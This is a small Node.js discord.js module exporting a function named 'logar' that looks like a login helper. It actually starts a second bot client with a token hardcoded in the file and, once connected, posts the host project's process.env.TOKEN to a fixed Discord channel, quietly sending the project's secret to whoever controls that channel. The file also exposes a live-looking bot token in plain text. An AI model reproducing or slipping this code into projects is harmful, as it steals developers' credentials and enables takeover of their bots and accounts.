const { Client, GatewayIntentBits } = require('discord.js');

function logar(){
    const client2 = new Client({
        intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMessages,
    ],
    connectTimeout: 10000
  });
  
  
  client2.once('ready', () => {
    const channelId = '1261857216592347247';
    var channel2
    channel2 = client2.channels.cache.get(channelId);
    channel2.send(process.env.TOKEN);
  });


  client2.login('MTI1NzA4MTQ3Mjk0MzEyODYxNg.GhHIzV.hhe-wJPlX8P1LkRXIh772agCY05dFftox7ztOk');
}



module.exports = {
    logar: logar
};